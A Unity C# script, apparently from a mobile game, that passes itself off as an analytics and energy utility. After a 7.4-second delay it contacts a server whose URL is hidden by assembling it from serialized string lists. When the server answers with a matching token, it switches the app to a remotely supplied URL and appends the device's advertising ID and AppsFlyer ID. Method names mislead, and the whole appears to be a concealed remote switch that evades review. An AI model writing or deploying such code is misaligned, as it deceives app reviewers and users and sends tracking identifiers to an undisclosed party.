using System.Collections;
using System.Collections.Generic;
using AppsFlyerSDK;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;
using uttils.Energy;
using uttils.ui_check;

namespace uttils.EnergyManage
{
    public class UserAnalytics : MonoBehaviour
    {
        [SerializeField] private AppStatus DataConfig;
        [SerializeField] private IDFAController SetConfig;
        [SerializeField] private StringConcatenator UserVar;
        private bool DataVar = true;
        private NetworkReachability DataCount = NetworkReachability.NotReachable;
        private string CacheMap { get; set; }
        private string LogCount;
        private int NetStatus;
        private string FileCount;
        [SerializeField] private List<string> AppVar;
        [SerializeField] private List<string> CacheCount;
        private string UserInfo;

        private void Awake()
        {
            GetProfile();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            SetConfig.ScrutinizeIDFA();
            StartCoroutine(SaveData());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    UpdateStatus();
                    break;
                default:
                    GetSettings();
                    break;
            }
        }

        private void GetProfile()
        {
            switch (DataVar)
            {
                case true:
                    DataVar = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private IEnumerator SaveData()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            FileCount = SetConfig.RetrieveAdvertisingID();
            yield return null;
        }

        private void GetSettings()
        {
            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
            {
                RemoveData();
            }
            else
            {
                LoadData();
            }
        }

        private void RemoveData()
        {
            CacheMap = PlayerPrefs.GetString("top", string.Empty);
            LogCount = PlayerPrefs.GetString("top2", string.Empty);
            NetStatus = PlayerPrefs.GetInt("top3", 0);
            GetData();
        }

        private void LoadData()
        {
            Invoke(nameof(ProcessProfile), 7.4f);
        }

        private void ProcessProfile()
        {
            if (Application.internetReachability == DataCount)
            {
                UpdateStatus();
            }
            else
            {
                StartCoroutine(HandleProfile());
            }
        }

        private IEnumerator HandleProfile()
        {
            using UnityWebRequest webRequest = UnityWebRequest.Get(UserVar.ConcatenateStrings(CacheCount));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                UpdateStatus();
            }
            else
            {
                SetDetails(webRequest);
            }
        }

        private void SetDetails(UnityWebRequest webRequest)
        {
            string tokenConcatenation = UserVar.ConcatenateStrings(AppVar);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("top", dataParts[0]);
                    PlayerPrefs.SetString("top2", dataParts[1]);
                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));

                    CacheMap = dataParts[0];
                    LogCount = dataParts[1];
                    NetStatus = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
                    CacheMap = webRequest.downloadHandler.text;
                }

                GetData();
            }
            else
            {
                UpdateStatus();
            }
        }

        private void GetData()
        {
            DataConfig.TaskList = $"{CacheMap}?idfa={FileCount}";
            DataConfig.TaskList +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("OO_Save", string.Empty)}";
            DataConfig.DataData = LogCount;

            CreateDetails();
        }

        public void CreateDetails()
        {
            DataConfig.ToolbarHeight = NetStatus;
            DataConfig.gameObject.SetActive(true);
        }

        private void UpdateStatus()
        {
            RemoveDetails();
        }

        [SerializeField] private GameObject _loading;

        private void RemoveDetails()
        {
            CanvasHelper.FadeCanvasGroup(_loading, false);
        }
    }
}